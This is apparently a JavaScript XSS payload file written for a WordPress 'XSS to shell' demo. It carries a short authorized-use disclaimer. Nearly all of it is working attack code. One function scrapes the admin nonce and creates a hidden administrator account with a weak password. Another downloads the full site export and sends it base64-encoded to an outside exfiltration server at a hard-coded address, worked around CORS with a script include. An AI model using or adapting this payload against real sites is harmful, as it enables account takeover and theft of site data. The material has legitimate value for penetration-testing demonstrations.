/*
	JavaScript functions designed to be used as a XSS payload
	against a WordPress admin. 

	Built for an XSS to shell demo/talk. 

	Inject a script include for this file. 

	Only use this code for pentesting systems you're authorized to 
	touch. Or I will be seriously grumpy in your general direction. 


	@hoodoer

	https://github.com/hoodoer
*/




// Web server listening for exfil data
// This will be as base64 data with a .js added, trying to 
// include a non-exist remote javascript file so you 
// get the base64 data in the 404 log
var httpExfilServer = "http://192.168.78.135:8888"


function read_body(xhr) { 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}





function sendAddUserPost(nonce)
{
	// The following user will be added as an Administrator level user
	var username  = "ishouldntbehere";
	var email     = "advancedadmin%40bad.af"
	var firstName = "trevor";
	var lastName  = "roach";
	var password  = "toor";

	var uri       = "/wp-admin/user-new.php";

	xhr = new XMLHttpRequest();
	xhr.open("POST", uri);

 	xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
 	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

	var body = "action=createuser&"
	body += "_wpnonce_create-user=" + nonce + "&"; 
	body += "_wp_http_referer=%2Fwp-admin%2Fuser-new.php&"
	body += "user_login=" + username + "&";
	body += "email=" + email + "&";
	body += "first_name=" + firstName + "&";
	body += "last_name=" + lastName + "&";
	body += "uri=&";
	body += "pass1=" + password + "&";
	body += "pass1-text=" + password + "&";
	body += "pass2=" + password + "&";
	body += "pw_weak=on&";
	body += "send_user_notification=0&";
	body += "role=subscriber&";
	body += "ure_select_other_roles=administrator&"; // muahahahaha 
	body += "ure_other_roles=administrator&"; // insert Dr. Evil second muahahahaha
	body += "createuser=Add+New+User";

	xhr.send(body);
}


// Parse out the nonce value then pass to the add user function
function getNonceAndAddUser()
{
	// console.log("Starting getNonce...");
	var uri = "/wp-admin/user-new.php";

	xhr = new XMLHttpRequest();

	xhr.open("GET", uri, true);
	xhr.send(null);


	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);
			var noncePos = response.indexOf('name="_wpnonce_create-user" value="');
		//	console.log("Nonce position: " + noncePos);

			var nonceVal = response.substring(noncePos+35, noncePos+45);
			sendAddUserPost(nonceVal);
		}
	}
}



// Exports the content of the wordpress site, incase you want to clone it
// Exfils the base64 encoded content as as script include, e.g. [base64 data].js
// because we can't just GET parameter it out due to CORS in wordpress
function exportWordPressSite()
{
	var uri = "/wp-admin/export.php?download=true&content=all&cat=0&post_author=0&post_start_date=0&post_end_date=0&post_status=0&page_author=0&page_start_date=0&page_end_date=0&page_status=0&attachment_start_date=0&attachment_end_date=0&submit=Download+Export+File";
	
	xhr = new XMLHttpRequest();
	
	xhr.open("GET", uri, true);
	xhr.send(null);

	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);

			// This will fail since the script doesn't exist, but you'll
			// get the base64 data on the 404 log on the server. 
			// You can't just do an XHR request
			// off to the external server due to the CORS policy
			var script = document.createElement("script");
			script.src = httpExfilServer + "/script/" + btoa(response) + ".js";

    		document.head.appendChild(script);  // add it to the end of the head section of the page (could change 'head' to 'body' to add it to the end of the body section instead)
		}
	}
}




// Uncomment the function you want to run on the XSS pop
//getNonceAndAddUser();
//exportWordPressSite();

